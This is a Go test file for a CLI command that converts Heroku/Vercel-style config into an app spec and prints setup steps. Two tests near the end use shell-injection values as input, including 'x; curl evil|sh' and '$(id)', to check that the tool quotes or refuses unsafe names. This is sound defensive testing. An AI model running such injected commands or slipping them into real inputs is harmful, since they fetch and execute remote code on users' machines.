package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/GLINCKER/levelrail/internal/configtranslate"
	"github.com/GLINCKER/levelrail/internal/spec"
)

func runConfigCmd(t *testing.T, env map[string]string, args ...string) (int, string, string) {
	t.Helper()
	var out, errb bytes.Buffer
	lookup := func(k string) (string, bool) { v, ok := env[k]; return v, ok }
	code := runImportConfig("levelrail-cli", args, &out, &errb, lookup)
	return code, out.String(), errb.String()
}

func writeConfigDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for n, c := range files {
		if err := os.WriteFile(filepath.Join(dir, n), []byte(c), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func TestImportConfigPrintsSpecAndPortsFromEnv(t *testing.T) {
	dir := writeConfigDir(t, map[string]string{"Procfile": "web: node server.js\n"})
	code, out, _ := runConfigCmd(t, nil, dir)
	if code != exitOK || !strings.Contains(out, "8080") {
		t.Fatalf("code=%d out=%q", code, out)
	}
	code, out, _ = runConfigCmd(t, map[string]string{envImportWebPort: "9090"}, dir)
	if code != exitOK || !strings.Contains(out, "9090") || strings.Contains(out, "8080") {
		t.Fatalf("code=%d out=%q", code, out)
	}
}

func TestImportConfigBadPortEnvAndEmptyDir(t *testing.T) {
	dir := writeConfigDir(t, map[string]string{"Procfile": "web: x\n"})
	if code, _, _ := runConfigCmd(t, map[string]string{envImportWebPort: "nope"}, dir); code != exitValidation {
		t.Fatalf("bad port code=%d", code)
	}
	if code, _, _ := runConfigCmd(t, nil, t.TempDir()); code != exitValidation {
		t.Fatalf("empty dir code=%d", code)
	}
}

func TestImportConfigStrictOnlyFailsOnBlockers(t *testing.T) {
	dir := writeConfigDir(t, map[string]string{
		"vercel.json": `{"framework":"vite","crons":[{"path":"/a","schedule":"0 * * * *"}]}`,
	})
	code, out, errOut := runConfigCmd(t, nil, dir)
	if code != exitOK || !strings.Contains(errOut, "BLOCKER") || !strings.Contains(errOut, "fix:") {
		t.Fatalf("lenient code=%d err=%q", code, errOut)
	}
	if !strings.Contains(out, "version") {
		t.Fatalf("spec missing: %q", out)
	}
	if code, _, _ := runConfigCmd(t, nil, "--strict", dir); code != exitValidation {
		t.Fatalf("strict code=%d", code)
	}
}

func TestImportConfigJSONAndOut(t *testing.T) {
	dir := writeConfigDir(t, map[string]string{"Procfile": "web: x\n"})
	code, out, _ := runConfigCmd(t, nil, "--json", dir)
	var got importConfigOutput
	if code != exitOK || json.Unmarshal([]byte(out), &got) != nil || got.Spec == "" || got.Findings == nil {
		t.Fatalf("code=%d out=%q", code, out)
	}
	target := filepath.Join(t.TempDir(), "app.yaml")
	code, out, _ = runConfigCmd(t, nil, "--out", target, dir)
	b, err := os.ReadFile(target) //nolint:gosec // a path inside the test temp dir
	if code != exitOK || out != "" || err != nil || !strings.Contains(string(b), "version") {
		t.Fatalf("code=%d out=%q err=%v", code, out, err)
	}
}

func TestImportConfigPrintsNextSteps(t *testing.T) {
	dir := writeConfigDir(t, map[string]string{
		"Procfile": "web: node server.js\nworker: node w.js\n",
		"app.json": `{"addons":["heroku-postgresql:essential-0"],"env":{"STRIPE_KEY":{"required":true}}}`,
	})
	code, _, errOut := runConfigCmd(t, nil, dir)
	if code != exitOK {
		t.Fatalf("code=%d", code)
	}
	for _, want := range []string{"NEXT STEPS", "apps create --file app.yaml --service web", "--service worker", "--secret STRIPE_KEY=VALUE", "databases create --name main --engine postgres"} {
		if !strings.Contains(errOut, want) {
			t.Errorf("stderr missing %q:\n%s", want, errOut)
		}
	}
}

const roundTripApp = `{"addons":["heroku-postgresql:essential-0"],"env":{"STRIPE_KEY":{"required":true}}}`

func TestImportConfigEmitsAppCreatableFile(t *testing.T) {
	dir := writeConfigDir(t, map[string]string{"Procfile": "web: node server.js\n", "app.json": roundTripApp})
	code, out, _ := runConfigCmd(t, nil, dir)
	if code != exitOK {
		t.Fatalf("code=%d", code)
	}
	parsed, err := spec.Parse([]byte(out))
	if err != nil {
		t.Fatalf("emitted file does not parse: %v\n%s", err, out)
	}
	if err := checkUnappliedSections(parsed, "web", "levelrail", "app.yaml"); err != nil {
		t.Fatalf("emitted file has unapplied sections: %v\n%s", err, out)
	}
}

func TestImportConfigStepOrder(t *testing.T) {
	dir := writeConfigDir(t, map[string]string{"Procfile": "web: node server.js\n", "app.json": roundTripApp})
	_, _, errOut := runConfigCmd(t, nil, dir)
	order := []string{"databases create --name main", "apps create --file app.yaml", "databases link main APP"}
	last := -1
	for _, want := range order {
		i := strings.Index(errOut, want)
		if i < 0 || i < last {
			t.Fatalf("step %q missing or out of order:\n%s", want, errOut)
		}
		last = i
	}
}

func TestImportConfigNeverPrintsUnsafeNamesUnquoted(t *testing.T) {
	bad := []string{"x; curl evil|sh", "$(id)", "`id`", "a\nb", "a b", "x'y"}
	for _, name := range bad {
		app, err := json.Marshal(map[string]any{"addons": []map[string]string{{"plan": "heroku-postgresql:mini", "as": name}}})
		if err != nil {
			t.Fatal(err)
		}
		dir := writeConfigDir(t, map[string]string{"Procfile": "web: node s.js\n", "app.json": string(app)})
		code, out, errOut := runConfigCmd(t, nil, dir)
		if code != exitOK {
			t.Fatalf("%q: code=%d err=%q", name, code, errOut)
		}
		for _, line := range strings.Split(errOut, "\n") {
			if !strings.Contains(line, "databases ") {
				continue
			}
			for _, frag := range []string{"curl evil", "$(id)", "`id`", "x'y"} {
				if strings.Contains(line, frag) && !strings.Contains(line, "'") {
					t.Errorf("%q: unquoted fragment %q in step %q", name, frag, line)
				}
			}
			if strings.HasPrefix(strings.TrimSpace(line), "levelrail-cli databases") && strings.ContainsAny(line, ";|$`") {
				t.Errorf("%q: unsafe step printed: %q", name, line)
			}
		}
		if !strings.Contains(errOut+out, "not a valid") {
			t.Errorf("%q: invalid name not reported\n%s", name, errOut)
		}
	}
}

func TestImportConfigStepsRefuseAndQuote(t *testing.T) {
	f := configtranslate.Fragment{
		Databases: map[string]configtranslate.Database{"x; curl evil|sh": {Engine: "postgres"}, "main": {Engine: "postgres"}},
		Services: map[string]configtranslate.Service{"web": {Env: map[string]configtranslate.Env{
			"A": {From: "postgres.$(id).url"}, "B": {From: "postgres.main.url"}}}},
	}
	steps := strings.Join(importConfigSteps(f, "levelrail-cli", "my spec;x.yaml"), "\n")
	if strings.Contains(steps, "--name x;") || strings.Contains(steps, "link $(id)") {
		t.Errorf("unsafe name printed as a command:\n%s", steps)
	}
	if !strings.Contains(steps, "not a valid") || !strings.Contains(steps, "databases create --name main ") {
		t.Errorf("invalid not reported or valid dropped:\n%s", steps)
	}
	if !strings.Contains(steps, "'my spec;x.yaml'") {
		t.Errorf("spec file not quoted:\n%s", steps)
	}
}
